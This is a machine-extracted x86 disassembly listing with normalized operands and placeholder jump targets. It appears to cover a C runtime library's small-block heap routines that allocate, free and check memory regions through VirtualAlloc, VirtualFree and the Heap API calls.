mov ebx [ ebp - 0x8 ]
and ebx 0x1
mov [ ebp - 0xc ] ebx
jne r-xdata
push 0x3f
pop edx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
push 0x3f
pop edx
mov ebx [ ebp + 0x8 ]
sub esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
sar ebx 0x4
push 0x3f
mov [ ebp + 0xc ] esi
dec ebx
pop esi
cmp ebx esi
jbe r-xdata
mov edx [ ebx + 0x8 ]
mov ebx [ ebx + 0x4 ]
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0xc ]
mov [ edx + 0x4 ] ebx
mov edx [ ebp + 0xc ]
mov ebx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ ebx + 0x8 ] edx
mov [ ebp - 0x4 ] ecx
mov ebx 0x80000000
cmp edx 0x20
jae r-xdata
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edx * 8 ]
mov ebx [ ecx + 0x4 ]
mov [ esi + 0x8 ] ecx
mov [ esi + 0x4 ] ebx
mov [ ecx + 0x4 ] esi
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov ecx [ esi + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
cmp ebx edx
je r-xdata
add ecx [ ebp - 0x8 ]
mov edx ecx
sar edx 0x4
dec edx
mov [ ebp - 0x4 ] ecx
cmp edx esi
jbe r-xdata
mov ebx esi
lea ecx [ edx - 0x20 ]
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx edx
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov [ eax + esi - 0x4 ] eax
mov eax [ ebp - 0x10 ]
dec [ eax ]
jne r-xdata
mov cl [ edx + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
mov [ edx + eax + 0x4 ] cl
cmp edx 0x20
jae r-xdata
cmp ebx edx
je r-xdata
mov edx esi
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
pop ebx
mov eax [ rwxdata ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov esi [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rwxdata ] eax
mov [ rwxdata ] edi
mov ecx [ rwxdata ]
mov esi [ VirtualFree@IAT ]
push 0x4000
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push ebx
push ecx
call esi
mov ecx [ rwxdata ]
mov eax [ rwxdata ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rwxdata ]
mov eax [ eax + 0x10 ]
mov ecx [ rwxdata ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rwxdata ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rwxdata ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edx - 0x20 ]
mov edx 0x80000000
shr edx cl
lea eax [ eax + edi * 4 + 0xc4 ]
or [ eax ] edx
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea eax [ eax + edi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ecx edx
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ esi + 0x8 ] ecx
mov esi 0x80000000
cmp ebx 0x20
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rwxdata ]
lea ecx [ ebx - 0x20 ]
shr esi cl
not esi
and [ eax + edi * 4 + 0xc4 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
mov ecx ebx
shr esi cl
not esi
and [ eax + edi * 4 + 0x44 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call esi
mov eax [ rwxdata ]
push [ eax + 0x10 ]
push 0x0
push [ rwxdata ]
call [ HeapFree@IAT ]
mov ecx [ rwxdata ]
mov eax [ rwxdata ]
imul ecx ecx 0x14
mov edx [ rwxdata ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_4213a0
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rwxdata ]
cmp eax [ rwxdata ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
and [ ecx ] esi
jmp r-xdata
mov eax [ rwxdata ]
mov [ rwxdata ] eax
sub [ ebp + 0x8 ] 0x14
sub_41802b
mov eax [ rwxdata ]
push esi
mov esi [ rwxdata ]
push edi
xor edi edi
cmp esi eax
jne r-xdata
imul esi esi 0x14
add esi [ rwxdata ]
push 0x41c4
push 0x8
push [ rwxdata ]
call [ HeapAlloc@IAT ]
mov [ esi + 0x10 ] eax
cmp eax edi
je r-xdata
add eax 0x10
imul eax eax 0x14
push eax
push [ rwxdata ]
push edi
push [ rwxdata ]
call [ HeapReAlloc@IAT ]
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
mov [ esi + 0xc ] eax
cmp eax edi
jne r-xdata
add [ rwxdata ] 0x10
mov esi [ rwxdata ]
mov [ rwxdata ] eax
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rwxdata ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rwxdata ]
call [ HeapFree@IAT ]
jmp r-xdata
sub_4180db
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
push ebx
push esi
mov esi [ ecx + 0x10 ]
push edi
xor ebx ebx
jmp r-xdata
test eax eax
jge r-xdata
add eax eax
inc ebx
mov eax ebx
imul eax eax 0x204
lea eax [ eax + esi + 0x144 ]
push 0x3f
mov [ ebp - 0x8 ] eax
pop edx
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
push 0x4
mov edi ebx
push 0x1000
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
lea edx [ edi + 0x7000 ]
mov [ ebp - 0x4 ] edx
cmp edi edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1f8
lea ecx [ edi + 0xc ]
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
xor edi edi
inc edi
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
mov ecx edx
sub ecx edi
shr ecx 0xc
lea eax [ edi + 0x10 ]
inc ecx
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea edx [ eax + 0xffc ]
mov [ eax ] edx
lea edx [ eax - 0x1004 ]
mov [ eax - 0x4 ] 0xff0
mov [ eax + 0x4 ] edx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
dec ecx
jne r-xdata
mov edx [ ebp - 0x4 ]
sub_4181e3
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov edx edi
sub edx [ ecx + 0xc ]
add esi 0x17
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
and esi 0xfffffff0
dec ecx
cmp esi ecx
lea edi [ ecx + edi - 0x4 ]
mov ebx [ edi ]
mov [ ebp + 0x10 ] ecx
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
jne r-xdata
xor eax eax
inc eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
sar esi 0x4
dec esi
mov [ ebp + 0xc ] ebx
mov [ ebx - 0x4 ] ecx
cmp esi 0x3f
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
mov [ ebp - 0x8 ] ecx
cmp ecx 0x3f
jbe r-xdata
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] edi
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
mov [ esi + eax + 0x4 ] cl
cmp esi 0x20
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov ebx 0x80000000
cmp ecx 0x20
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov esi [ edi + 0x8 ]
mov ecx [ edi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx 0x80000000
cmp esi 0x20
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
lea ecx [ ecx + esi - 0x4 ]
cmp edi 0x3f
jbe r-xdata
add ecx 0xffffffe0
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx esi
jmp r-xdata
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx 0x80000000
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
mov [ ebp + 0x13 ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
cmp edi 0x20
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx edi
jmp r-xdata
mov ecx edi
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
mov edx 0x80000000
shr edx cl
or [ eax ] edx
sub_4184c4
mov eax [ rwxdata ]
test eax eax
je r-xdata
retn
mov ecx [ rwxdata ]
push 0x4000
shl ecx 0xf
add ecx [ eax + 0xc ]
push 0x8000
push ecx
call [ VirtualFree@IAT ]
mov ecx [ rwxdata ]
mov eax [ rwxdata ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rwxdata ]
mov eax [ eax + 0x10 ]
mov ecx [ rwxdata ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rwxdata ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rwxdata ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rwxdata ]
and [ rwxdata ] 0x0
cmp [ rwxdata ] 0x1
jle r-xdata
push [ eax + 0x10 ]
push 0x0
push [ rwxdata ]
call [ HeapFree@IAT ]
mov ecx [ rwxdata ]
mov eax [ rwxdata ]
imul ecx ecx 0x14
mov edx [ rwxdata ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_4213a0
add esp 0xc
dec [ rwxdata ]
sub_418591
mov edi edi
push ebp
mov ebp esp
mov eax [ rwxdata ]
sub esp 0x138
push ebx
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp [ rwxdata ] ebx
push esi
mov edx eax
push edi
mov [ ebp - 0x34 ] edx
mov [ ebp - 0x1c ] ebx
jle r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
mov eax [ edx + 0x10 ]
cmp eax ebx
je r-xdata
pop ebx
leave
retn
push 0xfffffffe
jmp r-xdata
mov ecx [ edx + 0xc ]
mov [ ebp - 0x8 ] ecx
lea ecx [ eax + 0x144 ]
mov [ ebp - 0x24 ] ecx
mov ecx [ edx + 0x8 ]
lea esi [ eax + 0xc4 ]
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x38 ] esi
pop eax
jmp r-xdata
mov eax [ ebp - 0x28 ]
cmp eax [ esi - 0x80 ]
jne r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
pop edi
pop esi
push 0xfffffff0
jmp r-xdata
mov eax [ ebp - 0x18 ]
cmp eax [ esi ]
jne r-xdata
push 0xfffffffc
jmp r-xdata
mov edx [ ebp - 0x8 ]
add edx 0xffc
add [ ebp - 0x8 ] 0x8000
add [ ebp - 0x24 ] 0x204
shl [ ebp - 0x20 ] 0x1
inc [ ebp - 0xc ]
add esi 0x4
cmp [ ebp - 0xc ] 0x20
mov [ ebp - 0x38 ] esi
jl r-xdata
push 0xfffffffb
jmp r-xdata
cmp [ edx ] 0xffffffff
jne r-xdata
push 0x40
xor eax eax
cmp [ ebp - 0x20 ] ebx
pop ecx
lea edi [ ebp - 0x138 ]
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x4 ] ebx
[ edi ]
jl r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ edx ]
jne r-xdata
mov ecx [ esi ]
mov edi ecx
test cl 0x1
je r-xdata
push 0xffffffef
mov eax [ ebp - 0x14 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
mov eax ecx
sar eax 0x4
dec eax
cmp eax 0x3f
jle r-xdata
dec ecx
cmp ecx 0x400
jg r-xdata
add edx 0x14
inc [ ebp - 0x1c ]
mov eax [ ebp - 0x1c ]
cmp eax [ rwxdata ]
mov [ ebp - 0x34 ] edx
jl r-xdata
lea eax [ ebp + eax * 4 - 0x138 ]
inc [ eax ]
push 0x3f
pop eax
push 0xfffffffa
jmp r-xdata
inc [ ebp - 0x4 ]
jmp r-xdata
push 0xfffffff9
jmp r-xdata
test cl 0xf
jne r-xdata
cmp ecx 0x10
jl r-xdata
cmp ecx 0xff0
jg r-xdata
lea eax [ ecx + esi ]
cmp [ eax - 0x4 ] edi
jne r-xdata
push 0xfffffff8
jmp r-xdata
mov esi eax
cmp esi edx
jb r-xdata
jne r-xdata
add edx 0x1000
inc ebx
cmp ebx 0x8
jl r-xdata
cmp [ edx - 0xff4 ] 0xffffffff
lea esi [ edx - 0xff0 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ ebp - 0x24 ]
cmp [ edi ] eax
jne r-xdata
push 0xfffffff7
jmp r-xdata
xor esi esi
mov eax [ ebp - 0x2c ]
cmp [ eax + 0x4 ] edi
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp + esi * 4 - 0x138 ]
je r-xdata
push 0xfffffff2
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp + esi * 4 - 0x138 ]
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
cmp eax ecx
jb r-xdata
cmp [ ebx ] eax
jne r-xdata
cmp esi 0x20
mov eax 0x80000000
jge r-xdata
push 0xfffffff6
jmp r-xdata
add ecx 0x8000
cmp eax ecx
jae r-xdata
push 0xfffffff1
jmp r-xdata
inc esi
cmp esi 0x40
mov edi ebx
jl r-xdata
lea ecx [ esi - 0x20 ]
shr eax cl
or [ ebp - 0x18 ] eax
or [ ebp - 0x14 ] eax
mov ecx esi
shr eax cl
or [ ebp - 0x28 ] eax
or [ ebp - 0x10 ] eax
jmp r-xdata
mov ecx eax
and ecx 0xfffff000
add ecx 0xc
lea edx [ ecx + 0xff0 ]
cmp ecx edx
je r-xdata
and [ ebp - 0x4 ] 0x0
lea ebx [ edi + 0x8 ]
mov eax [ ebx - 0x4 ]
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x30 ] ebx
cmp eax edi
je r-xdata
mov esi [ ebp - 0x38 ]
mov edx [ ebp - 0x34 ]
xor ebx ebx
push 0xfffffff5
jmp r-xdata
cmp ecx eax
je r-xdata
cmp ecx edx
je r-xdata
mov ebx [ ecx ]
and ebx 0xfffffffe
add ecx ebx
mov ebx [ ebp - 0x30 ]
cmp ecx edx
jne r-xdata
mov ecx [ eax ]
sar ecx 0x4
dec ecx
cmp ecx 0x3f
jle r-xdata
cmp ecx esi
jne r-xdata
push 0x3f
pop ecx
push 0xfffffff4
jmp r-xdata
mov ecx [ ebp - 0x2c ]
cmp [ eax + 0x8 ] ecx
jne r-xdata
push 0xfffffff3
jmp r-xdata
inc [ ebp - 0x4 ]
mov [ ebp - 0x2c ] eax
mov eax [ eax + 0x4 ]
cmp eax edi
jne r-xdata
sub_418875
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rwxdata ] esi
jne r-xdata
mov eax [ rwxdata ]
cmp eax 0x3
jne r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ ebp + 0x8 ]
cmp edi esi
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x3f8
jbe r-xdata
pop esi
pop ebp
retn
xor eax eax
inc eax
jmp r-xdata
cmp eax 0x1
jne r-xdata
mov [ rwxdata ] eax
xor eax eax
inc eax
jmp r-xdata
call sub_40d7cc
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
jmp r-xdata
pop edi
call sub_40d7cc
mov [ eax ] 0x16
cmp edi 0x3f8
ja r-xdata
call sub_40d7cc
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
jmp r-xdata
push edi
call sub_417c97
pop ecx
test eax eax
jne r-xdata
xor eax eax
mov [ rwxdata ] edi
mov [ rwxdata ] 0x3
sub_418924
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rwxdata ]
mov ecx [ ebp + 0x8 ]
imul eax eax 0x14
add eax [ rwxdata ]
add ecx 0x17
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
push ebx
dec ecx
cmp ecx 0x20
push esi
push edi
jge r-xdata
add ecx 0xffffffe0
or edx 0xffffffff
xor esi esi
shr edx cl
mov [ ebp - 0x8 ] edx
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx eax
jb r-xdata
mov ecx [ rwxdata ]
mov ebx ecx
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx eax
jne r-xdata
add ebx 0x14
mov [ rwxdata ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
mov [ ebp - 0x4 ] edx
cmp edx 0xffffffff
je r-xdata
mov ebx [ rwxdata ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
mov edx [ eax + 0xc4 ]
lea ecx [ eax + 0x44 ]
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx ecx
jb r-xdata
mov edx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
add ecx 0x4
jmp r-xdata
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
xor edi edi
and ecx esi
jne r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx ecx
jne r-xdata
test ecx ecx
jge r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
and ecx [ ebp - 0x8 ]
push 0x20
pop edi
jmp r-xdata
mov edi [ ecx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
add ebx 0x14
jmp r-xdata
add ecx ecx
inc edi
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
sar esi 0x4
dec esi
cmp esi 0x3f
mov [ ebp - 0x8 ] ecx
jle r-xdata
cmp ebx eax
jb r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
add ebx 0x14
mov [ ebp + 0x8 ] ebx
push ebx
call sub_4180db
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
je r-xdata
mov ebx [ rwxdata ]
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
test ecx ecx
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
mov ebx 0x80000000
jge r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx ecx
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rwxdata ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ edx + 0x8 ] ecx
mov [ edx + 0x4 ] edi
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx ecx
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rwxdata ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xb ] cl
inc cl
cmp esi 0x20
mov [ esi + eax + 0x4 ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov ebx [ ebp + 0x8 ]
and [ ebx ] ecx
jmp r-xdata
add ebx 0x14
call sub_41802b
mov ebx eax
mov [ ebp + 0x8 ] ebx
test ebx ebx
jne r-xdata
and [ rwxdata ] 0x0
cmp [ ebp + 0xb ] 0x0
jne r-xdata
cmp [ ebp + 0xb ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
